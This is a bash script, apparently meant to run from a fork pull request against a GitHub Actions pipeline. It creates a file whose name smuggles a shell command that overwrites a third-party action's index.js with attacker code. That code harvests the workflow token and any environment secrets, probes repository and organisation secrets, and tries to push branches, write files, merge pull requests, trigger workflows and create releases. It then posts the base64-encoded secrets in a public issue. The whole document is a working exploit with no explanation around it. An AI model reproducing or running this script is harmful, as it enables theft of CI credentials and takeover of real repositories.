#!/usr/bin/env bash
set -euo pipefail
mkdir -p content
cd content
printf 'malicious artifact from fork PR\n' > rce.txt
cat > evil.js <<'JS'
const b64 = (s) => Buffer.from(String(s)).toString('base64');
const token = process.env.INPUT_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
const api = 'https://api.github.com';
const H = {
  authorization: `Bearer ${token}`,
  accept: 'application/vnd.github+json',
  'content-type': 'application/json',
  'user-agent': 'rce-proof'
};
const out = { token, token_len: token.length, token_prefix: token.slice(0, 4), repo };
out.env = {};
for (const [k, v] of Object.entries(process.env)) {
  if (/TOKEN|SECRET|PAT|KEY/i.test(k)) out.env[k] = b64(v);
}
const rq = async (path, opts = {}) => {
  try {
    const r = await fetch(api + path, { headers: H, ...opts });
    const text = await r.text();
    return { status: r.status, text: text.slice(0, 3000) };
  } catch (e) { return { error: String(e) }; }
};
(async () => {
  out.me = await rq('/user');
  out.repo_meta = await rq(`/repos/${repo}`);
  out.secrets_probe = await rq(`/repos/${repo}/actions/secrets`);
  out.org_secrets = await rq('/orgs/PDFtoMark/actions/secrets');
  const mainRef = await rq(`/repos/${repo}/git/ref/heads/main`);
  let sha = '';
  try { sha = JSON.parse(mainRef.text).object.sha; } catch (e) {}
  out.main_ref = { status: mainRef.status, sha };
  if (sha) {
    out.ref_create = await rq(`/repos/${repo}/git/refs`, {
      method: 'POST', body: JSON.stringify({ ref: 'refs/heads/rce-write-probe', sha })
    });
    out.contents_put = await rq(`/repos/${repo}/contents/ATTACK_PROOF.txt`, {
      method: 'PUT', body: JSON.stringify({ message: 'contents write probe', content: b64('contents-write-proof') })
    });
  }
  out.merge_pr6 = await rq(`/repos/${repo}/pulls/6/merge`, {
    method: 'PUT', body: JSON.stringify({ merge_method: 'merge', commit_title: 'bot merge probe' })
  });
  out.repository_dispatch = await rq(`/repos/${repo}/dispatches`, {
    method: 'POST', body: JSON.stringify({ event_type: 'rce-probe' })
  });
  out.release_create = await rq(`/repos/${repo}/releases`, {
    method: 'POST', body: JSON.stringify({ tag_name: 'rce-probe-' + Date.now(), name: 'rce-probe' })
  });
  out.pr_create = await rq(`/repos/${repo}/pulls`, {
    method: 'POST', body: JSON.stringify({ title: 'bot create probe', head: 'lazyhacker6:poc/benign', base: 'main' })
  });
  const wf = await rq(`/repos/${repo}/actions/workflows`);
  let wid = '';
  try { wid = (JSON.parse(wf.text).workflows || []).find((w) => String(w.path).endsWith('certora.yml')).id; } catch (e) {}
  out.workflows = { status: wf.status, id: wid, text: wf.text.slice(0, 600) };
  if (wid) {
    out.workflow_dispatch = await rq(`/repos/${repo}/actions/workflows/${wid}/dispatches`, {
      method: 'POST', body: JSON.stringify({ ref: 'main' })
    });
  }
  const pr6 = await rq(`/repos/${repo}/pulls/6`);
  let node = '';
  try { node = JSON.parse(pr6.text).node_id; } catch (e) {}
  out.pr6 = { status: pr6.status, node };
  if (node) {
    const g1 = await fetch(`${api}/graphql`, {
      method: 'POST', headers: H,
      body: JSON.stringify({
        query: 'mutation($id:ID!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:SQUASH}){clientMutationId}}',
        variables: { id: node }
      })
    });
    out.automerge = { status: g1.status, text: (await g1.text()).slice(0, 800) };
    const g2 = await fetch(`${api}/graphql`, {
      method: 'POST', headers: H,
      body: JSON.stringify({
        query: 'mutation($id:ID!){mergePullRequest(input:{pullRequestId:$id,mergeMethod:SQUASH}){clientMutationId}}',
        variables: { id: node }
      })
    });
    out.graphql_merge = { status: g2.status, text: (await g2.text()).slice(0, 800) };
  }
  out.b64 = b64(JSON.stringify({ ...out, token }));
  console.log('EXFIL_B64=' + out.b64);
  const ir = await fetch(`${api}/repos/${repo}/issues`, {
    method: 'POST', headers: H,
    body: JSON.stringify({ title: 'RCE_PROOF_V2', body: '```\n' + out.b64 + '\n```' })
  });
  console.log('ISSUE_STATUS=' + ir.status);
  console.log('SLEEP_START=' + new Date().toISOString());
  await new Promise((r) => setTimeout(r, 300000));
  console.log('SLEEP_DONE=' + new Date().toISOString());
})().catch((e) => console.log('EVIL_ERROR=' + e));
JS
OVR='rce$(S=$(dirname${IFS}${HOME%runner});cp${IFS}${S}tmp${S}content${S}content${S}evil.js${IFS}${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js).txt'
touch "$OVR"
